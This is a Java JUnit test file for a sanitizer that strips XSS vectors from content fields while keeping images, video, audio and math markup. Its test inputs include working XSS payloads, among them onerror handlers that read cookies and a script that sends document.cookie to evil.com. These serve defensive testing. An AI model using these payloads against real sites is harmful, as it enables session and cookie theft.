package org.sunbird.common;

import org.junit.Assert;
import org.junit.Test;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class HtmlSanitizerTest {

    // === escapeHtml tests ===

    @Test
    public void testEscapeHtmlWithScriptTag() {
        String input = "<script>alert('xss')</script>";
        String result = HtmlSanitizer.escapeHtml(input);
        Assert.assertFalse(result.contains("<script>"));
        Assert.assertTrue(result.contains("&lt;script&gt;"));
    }

    @Test
    public void testEscapeHtmlWithImgOnerror() {
        String input = "<img src=x onerror=\"steal(document.cookie)\">";
        String result = HtmlSanitizer.escapeHtml(input);
        Assert.assertFalse("Should not contain raw HTML tag", result.contains("<img"));
        Assert.assertTrue("Should contain escaped tag", result.contains("&lt;img"));
        Assert.assertTrue("Should contain escaped quotes", result.contains("&quot;"));
    }

    @Test
    public void testEscapeHtmlPreservesPlainText() {
        String input = "Paris is the capital of France";
        Assert.assertEquals(input, HtmlSanitizer.escapeHtml(input));
    }

    @Test
    public void testEscapeHtmlWithNull() {
        Assert.assertNull(HtmlSanitizer.escapeHtml(null));
    }

    @Test
    public void testEscapeHtmlWithEmpty() {
        Assert.assertEquals("", HtmlSanitizer.escapeHtml(""));
    }

    @Test
    public void testEscapeHtmlWithAmpersand() {
        String input = "Tom & Jerry";
        Assert.assertEquals("Tom &amp; Jerry", HtmlSanitizer.escapeHtml(input));
    }

    @Test
    public void testEscapeHtmlWithAllSpecialChars() {
        String input = "<div class=\"test\">'hello'</div>";
        String result = HtmlSanitizer.escapeHtml(input);
        Assert.assertTrue(result.contains("&lt;"));
        Assert.assertTrue(result.contains("&gt;"));
        Assert.assertTrue(result.contains("&quot;"));
        Assert.assertTrue(result.contains("&#39;"));
    }

    // === sanitizeStrict tests ===

    @Test
    public void testSanitizeStrictStripsAllHtml() {
        String input = "<script>alert(1)</script>Hello";
        String result = HtmlSanitizer.sanitizeStrict(input);
        Assert.assertFalse(result.contains("<script>"));
        Assert.assertTrue(result.contains("Hello"));
    }

    @Test
    public void testSanitizeStrictStripsImgTag() {
        String input = "Test<img src=x onerror=alert(1)>Name";
        String result = HtmlSanitizer.sanitizeStrict(input);
        Assert.assertFalse(result.contains("<img"));
        Assert.assertFalse(result.contains("onerror"));
        Assert.assertTrue(result.contains("Test"));
        Assert.assertTrue(result.contains("Name"));
    }

    @Test
    public void testSanitizeStrictPreservesPlainText() {
        String input = "Normal content name";
        Assert.assertEquals(input, HtmlSanitizer.sanitizeStrict(input));
    }

    @Test
    public void testSanitizeStrictWithNull() {
        Assert.assertNull(HtmlSanitizer.sanitizeStrict(null));
    }

    @Test
    public void testSanitizeStrictStripsIframe() {
        String input = "<iframe src=\"http://evil.com\"></iframe>Safe";
        String result = HtmlSanitizer.sanitizeStrict(input);
        Assert.assertFalse(result.contains("<iframe"));
        Assert.assertTrue(result.contains("Safe"));
    }

    @Test
    public void testSanitizeStrictStripsEventHandlers() {
        String input = "<div onmouseover=\"steal()\">Hover me</div>";
        String result = HtmlSanitizer.sanitizeStrict(input);
        Assert.assertFalse(result.contains("onmouseover"));
        Assert.assertFalse(result.contains("steal"));
    }

    // === sanitizeRichText tests ===

    @Test
    public void testSanitizeRichTextAllowsSafeTags() {
        String input = "<p>Hello <b>world</b></p>";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue(result.contains("<p>"));
        Assert.assertTrue(result.contains("<b>"));
    }

    @Test
    public void testSanitizeRichTextStripsScript() {
        String input = "<p>Safe</p><script>alert(1)</script>";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue(result.contains("<p>"));
        Assert.assertFalse(result.contains("<script>"));
    }

    @Test
    public void testSanitizeRichTextStripsOnerror() {
        String input = "<p>Text</p><img src=x onerror=\"steal()\">";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue(result.contains("<p>"));
        Assert.assertFalse(result.contains("onerror"));
    }

    @Test
    public void testSanitizeRichTextAllowsImgWithHttpsSrc() {
        String input = "<p>See</p><img src=\"https://cdn.example.com/diagram.png\" alt=\"Diagram\">";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue("Should keep img tag", result.contains("<img"));
        Assert.assertTrue("Should keep https src", result.contains("https://cdn.example.com/diagram.png"));
        Assert.assertTrue("Should keep alt", result.contains("alt=\"Diagram\""));
    }

    @Test
    public void testSanitizeRichTextAllowsImgWithBlobSrc() {
        String input = "<img src=\"blob:https://example.com/9d4a-44e2\">";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue("Should keep img tag", result.contains("<img"));
        Assert.assertTrue("Should keep blob src", result.contains("blob:https://example.com/9d4a-44e2"));
    }

    @Test
    public void testSanitizeRichTextKeepsImgButStripsOnerror() {
        String input = "<img src=\"https://cdn.example.com/x.png\" onerror=\"steal(document.cookie)\">";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue("Should keep img tag", result.contains("<img"));
        Assert.assertTrue("Should keep src", result.contains("https://cdn.example.com/x.png"));
        Assert.assertFalse("Should strip onerror handler", result.contains("onerror"));
        Assert.assertFalse("Should strip handler body", result.contains("document.cookie"));
    }

    @Test
    public void testSanitizeFieldBodyKeepsImageButStripsScript() {
        String input = "<p>Question</p><img src=\"https://cdn.example.com/q1.png\"><script>evil()</script>";
        String result = HtmlSanitizer.sanitizeField("body", input);
        Assert.assertTrue(result.contains("<img"));
        Assert.assertTrue(result.contains("https://cdn.example.com/q1.png"));
        Assert.assertFalse(result.contains("<script>"));
    }

    @Test
    public void testSanitizeRichTextKeepsFigureImgWithAssetVariable() {
        String input = "<figure class=\"image\"><img " +
                "src=\"https://edtestingda72f12a.blob.core.windows.net/x/chemistry.jpeg\" " +
                "alt=\"chemistry\" data-asset-variable=\"do_2145524591929589761177\"></figure>";
        String result = HtmlSanitizer.sanitizeField("question", input);
        Assert.assertTrue("Should keep figure", result.contains("<figure"));
        Assert.assertTrue("Should keep img", result.contains("<img"));
        Assert.assertTrue("Should keep blob/external src",
                result.contains("https://edtestingda72f12a.blob.core.windows.net/x/chemistry.jpeg"));
        Assert.assertTrue("Should keep data-asset-variable for editor re-link",
                result.contains("data-asset-variable=\"do_2145524591929589761177\""));
    }

    @Test
    public void testSanitizeRichTextAllowsVideoWithSource() {
        String input = "<video data-asset-variable=\"do_214601143504281600153\" width=\"400\" controls=\"\" poster=\"\">" +
                "<source type=\"video/mp4\" src=\"https://eddevda72f12a.blob.core.windows.net/x/bunny.webm\">" +
                "<source type=\"video/webm\" src=\"https://eddevda72f12a.blob.core.windows.net/x/bunny.webm\"></video>";
        String result = HtmlSanitizer.sanitizeField("solutions", input);
        Assert.assertTrue("Should keep video tag", result.contains("<video"));
        Assert.assertTrue("Should keep source tag", result.contains("<source"));
        Assert.assertTrue("Should keep source src", result.contains("https://eddevda72f12a.blob.core.windows.net/x/bunny.webm"));
        Assert.assertTrue("Should keep source type", result.contains("video/mp4"));
        Assert.assertTrue("Should keep data-asset-variable", result.contains("data-asset-variable=\"do_214601143504281600153\""));
    }

    @Test
    public void testSanitizeRichTextAllowsAudioWithSource() {
        String input = "<audio data-asset-variable=\"do_21460131755661721611\" width=\"400\" controls=\"\" poster=\"\">" +
                "<source type=\"audio/mp3\" src=\"https://eddevda72f12a.blob.core.windows.net/x/file.mp3\">" +
                "<source type=\"audio/wav\" src=\"https://eddevda72f12a.blob.core.windows.net/x/file.mp3\"></audio>";
        String result = HtmlSanitizer.sanitizeField("solutions", input);
        Assert.assertTrue("Should keep audio tag", result.contains("<audio"));
        Assert.assertTrue("Should keep source tag", result.contains("<source"));
        Assert.assertTrue("Should keep source src", result.contains("https://eddevda72f12a.blob.core.windows.net/x/file.mp3"));
        Assert.assertTrue("Should keep source type", result.contains("audio/mp3"));
        Assert.assertTrue("Should keep data-asset-variable", result.contains("data-asset-variable=\"do_21460131755661721611\""));
    }

    @Test
    public void testSanitizeMapKeepsI18nMediaSolutions() {
        // Reproduces the reported bug: i18n solutions map { "<id>": { en: img, ar: video, fr: audio, pt: img } }
        Map<String, Object> langMap = new HashMap<>();
        langMap.put("en", "<figure class=\"image\"><img src=\"https://blob.example.com/algebra.jpeg\" data-asset-variable=\"do_1\"></figure>");
        langMap.put("ar", "<video data-asset-variable=\"do_2\" controls=\"\"><source type=\"video/mp4\" src=\"https://blob.example.com/bunny.webm\"></video>");
        langMap.put("fr", "<audio data-asset-variable=\"do_3\" controls=\"\"><source type=\"audio/mp3\" src=\"https://blob.example.com/file.mp3\"></audio>");
        langMap.put("pt", "<figure class=\"image\"><img src=\"https://blob.example.com/agile.jpeg\" data-asset-variable=\"do_4\"></figure>");
        Map<String, Object> solutions = new HashMap<>();
        solutions.put("253ff36b-2daa-49ab-9f3f-7117a3d961d2", langMap);
        Map<String, Object> data = new HashMap<>();
        data.put("solutions", solutions);

        HtmlSanitizer.sanitizeMap(data);

        Map<String, Object> outSolutions = (Map<String, Object>) data.get("solutions");
        Map<String, Object> outLang = (Map<String, Object>) outSolutions.get("253ff36b-2daa-49ab-9f3f-7117a3d961d2");
        Assert.assertTrue("en image must survive", ((String) outLang.get("en")).contains("<img"));
        Assert.assertTrue("ar video must survive (was emptied before fix)", ((String) outLang.get("ar")).contains("<video"));
        Assert.assertTrue("ar source src must survive", ((String) outLang.get("ar")).contains("https://blob.example.com/bunny.webm"));
        Assert.assertTrue("fr audio must survive (was emptied before fix)", ((String) outLang.get("fr")).contains("<audio"));
        Assert.assertTrue("fr source src must survive", ((String) outLang.get("fr")).contains("https://blob.example.com/file.mp3"));
        Assert.assertTrue("pt image must survive", ((String) outLang.get("pt")).contains("<img"));
    }

    @Test
    public void testSanitizeRichTextKeepsVideoButStripsOnerror() {
        // Broadened media policy must NOT allow event handlers
        String input = "<video src=\"https://blob.example.com/x.mp4\" onerror=\"steal(document.cookie)\" controls=\"\"></video>";
        String result = HtmlSanitizer.sanitizeField("solutions", input);
        Assert.assertTrue("Should keep video tag", result.contains("<video"));
        Assert.assertFalse("Should strip onerror handler", result.contains("onerror"));
        Assert.assertFalse("Should strip handler body", result.contains("document.cookie"));
    }

    @Test
    public void testSanitizeRichTextStripsJavascriptSrcOnSource() {
        String input = "<video controls=\"\"><source type=\"video/mp4\" src=\"javascript:alert(1)\"></video>";
        String result = HtmlSanitizer.sanitizeField("solutions", input);
        Assert.assertFalse("Should strip javascript: protocol src", result.contains("javascript:"));
    }

    @Test
    public void testSanitizeMapKeepsMtfImageLabelsInEditorState() {
        // MTF labels are localized maps: editorState.pairs[].left.en / right.en
        String img = "<figure class=\"image\"><img src=\"https://blob.example.com/algebra.jpeg\" " +
                "data-asset-variable=\"do_123\"></figure>";
        Map<String, Object> left = new HashMap<>();
        left.put("en", img);
        Map<String, Object> pair = new HashMap<>();
        pair.put("left", left);
        List<Object> pairs = new ArrayList<>();
        pairs.add(pair);
        Map<String, Object> editorState = new HashMap<>();
        editorState.put("pairs", pairs);
        Map<String, Object> data = new HashMap<>();
        data.put("editorState", editorState);

        HtmlSanitizer.sanitizeMap(data);

        Map<String, Object> outEditorState = (Map<String, Object>) data.get("editorState");
        List<Object> outPairs = (List<Object>) outEditorState.get("pairs");
        Map<String, Object> outLeft = (Map<String, Object>) ((Map<String, Object>) outPairs.get(0)).get("left");
        String label = (String) outLeft.get("en");
        Assert.assertTrue("Deep label under editorState should keep img", label.contains("<img"));
        Assert.assertTrue("Should keep blob src", label.contains("https://blob.example.com/algebra.jpeg"));
    }

    @Test
    public void testSanitizeMapKeepsMtfImageLabelsInInteractions() {
        // interactions.response1.options.left[].label.en
        String img = "<img src=\"https://blob.example.com/auditing.jpg\">";
        Map<String, Object> label = new HashMap<>();
        label.put("en", img);
        Map<String, Object> option = new HashMap<>();
        option.put("label", label);
        List<Object> leftOptions = new ArrayList<>();
        leftOptions.add(option);
        Map<String, Object> options = new HashMap<>();
        options.put("left", leftOptions);
        Map<String, Object> response1 = new HashMap<>();
        response1.put("type", "match");
        response1.put("options", options);
        Map<String, Object> interactions = new HashMap<>();
        interactions.put("response1", response1);
        Map<String, Object> data = new HashMap<>();
        data.put("interactions", interactions);

        HtmlSanitizer.sanitizeMap(data);

        Map<String, Object> outInteractions = (Map<String, Object>) data.get("interactions");
        Map<String, Object> outResp = (Map<String, Object>) outInteractions.get("response1");
        Map<String, Object> outOptions = (Map<String, Object>) outResp.get("options");
        List<Object> outLeft = (List<Object>) outOptions.get("left");
        Map<String, Object> outLabel = (Map<String, Object>) ((Map<String, Object>) outLeft.get(0)).get("label");
        String text = (String) outLabel.get("en");
        Assert.assertTrue("Deep label under interactions should keep img", text.contains("<img"));
        Assert.assertTrue("Should keep src", text.contains("https://blob.example.com/auditing.jpg"));
    }

    @Test
    public void testSanitizeMapStillStripsXssInDeepRichTextLabel() {
        // Broadened rich-text context must NOT allow scripts/handlers
        Map<String, Object> label = new HashMap<>();
        label.put("en", "<img src=x onerror=\"steal(document.cookie)\"><script>evil()</script>OK");
        Map<String, Object> editorState = new HashMap<>();
        editorState.put("title", label);
        Map<String, Object> data = new HashMap<>();
        data.put("editorState", editorState);

        HtmlSanitizer.sanitizeMap(data);

        Map<String, Object> outEditorState = (Map<String, Object>) data.get("editorState");
        String text = (String) ((Map<String, Object>) outEditorState.get("title")).get("en");
        Assert.assertFalse("onerror handler must be stripped", text.contains("onerror"));
        Assert.assertFalse("script must be stripped", text.contains("<script>"));
        Assert.assertFalse("handler body must be gone", text.contains("document.cookie"));
        Assert.assertTrue("plain text retained", text.contains("OK"));
    }

    @Test
    public void testSanitizeRichTextAllowsMathTags() {
        String input = "<math><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow></math>";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue(result.contains("<math>"));
        Assert.assertTrue(result.contains("<mi>"));
    }

    @Test
    public void testSanitizeRichTextAllowsTableTags() {
        String input = "<table><tr><td colspan=\"2\">Cell</td></tr></table>";
        String result = HtmlSanitizer.sanitizeRichText(input);
        Assert.assertTrue(result.contains("<table>"));
        Assert.assertTrue(result.contains("<td"));
    }

    // === sanitizeField tests (routing logic) ===

    @Test
    public void testSanitizeFieldBodyUsesRichText() {
        String input = "<p>Safe</p><script>evil</script>";
        String result = HtmlSanitizer.sanitizeField("body", input);
        Assert.assertTrue(result.contains("<p>"));
        Assert.assertFalse(result.contains("<script>"));
    }

    @Test
    public void testSanitizeFieldNameUsesStrict() {
        String input = "<script>alert(1)</script>My Content";
        String result = HtmlSanitizer.sanitizeField("name", input);
        Assert.assertFalse(result.contains("<script>"));
        Assert.assertTrue(result.contains("My Content"));
    }

    @Test
    public void testSanitizeFieldDescriptionUsesStrict() {
        String input = "Desc<img src=x onerror=alert(1)>";
        String result = HtmlSanitizer.sanitizeField("description", input);
        Assert.assertFalse(result.contains("<img"));
        Assert.assertTrue(result.contains("Desc"));
    }

    // === sanitizeMap tests (recursive) ===

    @Test
    public void testSanitizeMapStripsXssFromName() {
        Map<String, Object> data = new HashMap<>();
        data.put("name", "<script>alert('xss')</script>Test Content");
        data.put("code", "test-code");
        HtmlSanitizer.sanitizeMap(data);
        Assert.assertFalse(((String) data.get("name")).contains("<script>"));
        Assert.assertTrue(((String) data.get("name")).contains("Test Content"));
        Assert.assertEquals("test-code", data.get("code"));
    }

    @Test
    public void testSanitizeMapStripsXssFromDescription() {
        Map<String, Object> data = new HashMap<>();
        data.put("description", "<img src=x onerror=\"document.cookie\">");
        HtmlSanitizer.sanitizeMap(data);
        Assert.assertFalse(((String) data.get("description")).contains("<img"));
    }

    @Test
    public void testSanitizeMapHandlesNestedMaps() {
        Map<String, Object> inner = new HashMap<>();
        inner.put("label", "<script>steal()</script>Option A");
        Map<String, Object> data = new HashMap<>();
        data.put("interactions", inner);
        HtmlSanitizer.sanitizeMap(data);
        Map<String, Object> sanitizedInner = (Map<String, Object>) data.get("interactions");
        Assert.assertFalse(((String) sanitizedInner.get("label")).contains("<script>"));
    }

    @Test
    public void testSanitizeMapHandlesLists() {
        List<Object> options = new ArrayList<>();
        options.add("<script>xss</script>Option1");
        options.add("Option2");
        Map<String, Object> data = new HashMap<>();
        data.put("options", options);
        HtmlSanitizer.sanitizeMap(data);
        List<Object> sanitized = (List<Object>) data.get("options");
        Assert.assertFalse(((String) sanitized.get(0)).contains("<script>"));
        Assert.assertEquals("Option2", sanitized.get(1));
    }

    @Test
    public void testSanitizeMapHandlesNullMap() {
        HtmlSanitizer.sanitizeMap(null); // should not throw
    }

    @Test
    public void testSanitizeMapHandlesEmptyMap() {
        Map<String, Object> data = new HashMap<>();
        HtmlSanitizer.sanitizeMap(data); // should not throw
        Assert.assertTrue(data.isEmpty());
    }

    @Test
    public void testSanitizeMapPreservesNonStringValues() {
        Map<String, Object> data = new HashMap<>();
        data.put("name", "Safe Name");
        data.put("maxScore", 100);
        data.put("isPublished", true);
        HtmlSanitizer.sanitizeMap(data);
        Assert.assertEquals("Safe Name", data.get("name"));
        Assert.assertEquals(100, data.get("maxScore"));
        Assert.assertEquals(true, data.get("isPublished"));
    }

    // === XSS attack vector tests (from security report) ===

    @Test
    public void testXssVuln01_QuestionBodyPayload() {
        String payload = "<img src=x onerror=\"var d=document.createElement('div');d.id='xss-proof';" +
                "d.innerText='COOKIES:'+document.cookie;document.body.appendChild(d)\">";
        String result = HtmlSanitizer.sanitizeField("body", payload);
        Assert.assertFalse(result.contains("onerror"));
        Assert.assertFalse(result.contains("document.cookie"));
    }

    @Test
    public void testXssVuln02_OptionLabelPayload() {
        String payload = "<img src=x onerror=\"document.title='XSS-VULN-02: '+document.cookie\">";
        String escaped = HtmlSanitizer.escapeHtml(payload);
        Assert.assertFalse(escaped.contains("<img"));
        Assert.assertTrue(escaped.contains("&lt;img"));
    }

    @Test
    public void testXssVuln03_ContentNamePayload() {
        String payload = "<script>fetch('http://evil.com?c='+document.cookie)</script>Legit Name";
        String result = HtmlSanitizer.sanitizeField("name", payload);
        Assert.assertFalse(result.contains("<script>"));
        Assert.assertFalse(result.contains("fetch("));
        Assert.assertTrue(result.contains("Legit Name"));
    }

    @Test
    public void testXssVuln06_FrameworkTranslationsPayload() {
        String payload = "<img src=x onerror=\"console.log('XSS-TRANSLATIONS')\">";
        String result = HtmlSanitizer.sanitizeField("translations", payload);
        Assert.assertFalse(result.contains("<img"));
        Assert.assertFalse(result.contains("onerror"));
    }

    @Test
    public void testSanitizeMapPreservesMimeType() {
        Map<String, Object> data = new HashMap<>();
        data.put("mimeType", "image/svg+xml");
        data.put("name", "Test Asset");
        HtmlSanitizer.sanitizeMap(data);
        Assert.assertEquals("image/svg+xml", data.get("mimeType"));
    }

    @Test
    public void testSanitizeMapWithFrameworkXssPayload() {
        Map<String, Object> data = new HashMap<>();
        data.put("name", "<script>alert('xss-framework')</script>");
        data.put("description", "<img src=x onerror=alert(document.cookie)>");
        Map<String, Object> translations = new HashMap<>();
        translations.put("hi", "<img src=x onerror=\"console.log('XSS')\">");
        data.put("translations", translations);
        HtmlSanitizer.sanitizeMap(data);
        Assert.assertFalse(((String) data.get("name")).contains("<script>"));
        Assert.assertFalse(((String) data.get("description")).contains("<img"));
        Map<String, Object> sanitizedTranslations = (Map<String, Object>) data.get("translations");
        Assert.assertFalse(((String) sanitizedTranslations.get("hi")).contains("onerror"));
    }
}
